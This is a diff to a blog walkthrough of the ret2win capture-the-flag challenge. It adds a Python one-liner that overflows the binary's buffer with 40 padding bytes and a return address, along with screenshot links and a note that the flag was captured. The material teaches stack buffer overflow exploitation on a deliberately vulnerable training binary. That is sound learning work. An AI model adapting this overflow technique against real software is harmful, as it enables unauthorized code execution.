@@ -138,13 +138,25 @@ The payload will be very simple:
 [40 chars of junk] + [address of ret2win]
 "A"*40             + "\x11\x08\x40"
 
+Here is my final exploit: python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00"' | ./ret2win
 
-Here is the full exploit using pwntools.
+
+![source-01](/img/Screenshot_2020-05-09_15-53-55.png){: .align-left}
 
 
-----
+
+Putting it all together, we have the following exploit, used pwntools to learn the tool.
+
+Screenshot_2020-05-09_16-20-05.png	
+
+![source-01](/img/Screenshot_2020-05-09_16-20-05.png){: .align-left}
+
+
+w00t we got the flag!
+
 ### ~ End ~
-Thats the end of ret2win challenge,looking forward to do other challenges and learn new stuf.Remember never stop learning, Cheers!.Exploit code for this challenge is on my github 
+Thats the end of ret2win challenge, as i progress through the challenges the exploits will become more complex and fun.Remember never stop learning, Cheers!.
+> Exploit code for this challenge is on my github 
 
 
 
